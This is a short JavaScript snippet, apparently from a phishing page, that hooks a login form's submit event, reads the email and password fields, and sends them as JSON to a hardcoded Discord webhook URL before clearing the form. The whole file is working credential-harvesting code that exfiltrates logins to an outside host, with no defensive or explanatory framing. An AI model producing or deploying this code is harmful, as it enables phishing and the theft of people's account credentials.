document.querySelector('form').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevents the form from actually submitting

  var email = document.querySelector('input[type="email"]').value;
  var password = document.querySelector('input[type="password"]').value;

  // Construct the data to send
  var data = {
    email: email,
    password: password
  };

  // Discord Webhook URL
  var webhookURL = 'https://discord.com/api/webhooks/1470109902432370698/HD8rAVEc-NQy0pgkwwo__Zy5TrShEHqs3ZQPjwM-RHX-I99auXDn0Jw5vGe-v2-eHGUi';

  // Send the data to the Discord webhook
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      alert('Credentials sent successfully!');
      // Clear the form fields
      document.querySelector('input[type="email"]').value = '';
      document.querySelector('input[type="password"]').value = '';
    } else {
      alert('Failed to send credentials. Please try again.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('An error occurred. Check the console.');
  });
});
